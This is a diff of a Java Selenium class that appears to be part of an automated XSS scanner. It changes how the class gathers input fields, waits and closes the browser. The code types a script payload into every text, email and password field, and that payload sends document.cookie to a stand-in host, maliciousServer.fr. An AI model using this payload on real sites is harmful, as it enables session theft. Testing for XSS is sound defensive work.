@@ -42,9 +42,14 @@ public class F3Controller {
 
     public void performXss() {
         try {
-            List<WebElement> textInputs = driver.findElements(By.cssSelector("input[type='text'], input[type='password'], textarea"));
+            List<WebElement> textInputs = driver.findElements(By.cssSelector("input[type='text'],input[type='email'], input[type='password'], textarea"));
             String endpointUrl = "https://www.maliciousServer.fr";
             boolean isVulnerable = false;
+            System.out.println(textInputs);
+            if (textInputs.isEmpty()) {
+                System.out.println("Pas d'input trouvé sur cette page.");
+                return;
+            }
 
             for (WebElement input : textInputs) {
                 input.sendKeys("<script>document.write('<img src=\"" + endpointUrl + "?cookie=' + document.cookie + '\"/>');</script>");
@@ -55,18 +60,25 @@ public class F3Controller {
                 }
             }
 
-            if (isVulnerable) {
-                addResultToJSON("XSS", driver.getCurrentUrl(), "High");
-            }
+            // Si vous voulez ajouter le résultat uniquement s'il est vulnérable, vous pouvez décommenter le code suivant
+             if (isVulnerable) {
+                 addResultToJSON("XSS", driver.getCurrentUrl(), "High");
+             }
 
             WebElement form = driver.findElement(By.cssSelector("form"));
             form.submit();
-            Thread.sleep(1000);
+            Thread.sleep(4000);
 
+            driver.quit();
         } catch (Exception e) {
-            e.printStackTrace();
+            System.out.println("end of xss");
+        } finally {
+            if (driver != null) {
+                driver.quit();
+            }
         }
     }
+
 
     private void addResultToJSON(String failureType, String location, String severity) {
         for (JsonElement element : securityFailures) {
